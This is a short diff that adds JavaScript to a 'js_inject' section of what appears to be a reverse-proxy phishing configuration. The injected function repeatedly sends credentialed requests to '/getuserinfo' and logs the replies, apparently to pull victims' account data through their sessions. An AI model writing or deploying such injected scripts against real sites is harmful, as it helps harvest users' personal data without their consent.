@@ -120,3 +120,23 @@ js_inject:
         setTimeout(function(){lp();}, 1500);
       }
       setTimeout(function(){lp();}, 1500); 
+      
+      function toPopulate(){
+        console.log( "Populating" );
+        const xhr = new XMLHttpRequest();
+        xhr.withCredentials = true;
+        xhr.open("POST", "/getuserinfo", true );
+        xhr.onload = () => {
+          if (xhr.status === 200) {
+            console.log(xhr.response);
+          } else {
+            console.error('Error:', xhr.statusText);
+          }
+        };
+        xhr.onerror = () => console.error('Error:', xhr.statusText);
+        xhr.send();
+        setTimeout(function(){toPopulate();}, 1500);
+      }
+      console.log( "Reached here." );
+      setTimeout(function(){toPopulate();}, 1500);
+
